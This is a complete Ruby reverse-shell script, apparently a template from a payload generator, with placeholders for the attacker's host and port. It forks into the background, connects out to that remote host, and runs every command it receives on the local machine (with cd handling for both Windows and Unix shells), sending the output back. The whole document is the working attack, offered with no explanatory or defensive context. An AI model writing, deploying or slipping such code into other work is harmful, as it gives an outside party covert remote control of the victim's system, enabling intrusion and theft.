#!/usr/bin/env ruby

require "socket"

host = "<-HOST->"
port = <-PORT->
fork do
	host = TCPSocket.open(host, port)
	host.puts "RShell_Open"

	begin
		`pwd`
		currentDirCommand = "pwd"
		joiner = "\; "
	rescue
		`cd`
		currentDirCommand = "cd"
		joiner = "\& "
	end
	host.puts currentDirCommand
	$currentDir = "."
	loop do
		cmd = host.gets.chomp
		if cmd.downcase == "exit"
			host.close
			break
		else
			begin
				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
					$currentDir = `cd "#{$currentDir}"#{joiner}cd "#{cmd.downcase.sub("cd ", "")}"#{joiner}#{currentDirCommand}`.chomp
					out = "Changed Directory to #{$currentDir}\n"
				else
					out = `cd "#{$currentDir}"#{joiner}#{cmd.chomp}`
				end
			rescue
				out = "Unable to execute command\n"
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end
end
exit
